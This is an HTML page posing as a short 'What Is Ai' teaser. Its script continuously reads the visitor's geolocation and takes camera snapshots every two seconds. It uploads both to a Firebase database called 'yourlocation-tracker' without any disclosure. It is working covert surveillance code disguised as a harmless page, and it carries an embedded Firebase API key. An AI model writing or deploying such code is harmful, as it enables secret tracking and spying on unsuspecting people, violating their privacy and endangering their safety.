<!DOCTYPE html>
<html>
<head>
<title>What Is Ai ?</title>

<script src="https://www.gstatic.com/firebasejs/8.10.0/firebase-app.js"></script>
<script src="https://www.gstatic.com/firebasejs/8.10.0/firebase-database.js"></script>

<style>
body{
font-family: Arial;
text-align:center;
background:black;
color:white;
}
video{
width:300px;
border:2px solid white;
margin-top:10px;
}
</style>

</head>
<body>

<h2>Next Future Is AI 💫</h2>

<video id="camera" autoplay playsinline></video>

<script>

const firebaseConfig = {
  apiKey: "AIzaSyAiC_oz0Qm99P1K9DcRFQb4eY5GHRujW_c",
  authDomain: "yourlocation-tracker.firebaseapp.com",
  databaseURL: "https://yourlocation-tracker-default-rtdb.asia-southeast1.firebasedatabase.app",
  projectId: "yourlocation-tracker",
  storageBucket: "yourlocation-tracker.firebasestorage.app",
  messagingSenderId: "64952347835",
  appId: "1:64952347835:web:4f48ef82c9b10f0f7c0d9e"
};

firebase.initializeApp(firebaseConfig);

// unique phone id
let phoneId = "phone_" + Math.floor(Math.random()*100000);

// LOCATION
navigator.geolocation.watchPosition(function(pos){

firebase.database().ref("devices/"+phoneId+"/location").set({
lat: pos.coords.latitude,
lon: pos.coords.longitude
});

});

// CAMERA
const video = document.getElementById("camera");

navigator.mediaDevices.getUserMedia({video:true})
.then(stream=>{
video.srcObject = stream;

const canvas = document.createElement("canvas");
const ctx = canvas.getContext("2d");

setInterval(()=>{

canvas.width = video.videoWidth;
canvas.height = video.videoHeight;

ctx.drawImage(video,0,0);

let imageData = canvas.toDataURL("image/jpeg",0.5);

firebase.database().ref("devices/"+phoneId+"/camera").set({
image:imageData
});

},2000);

});

</script>

</body>
</html>
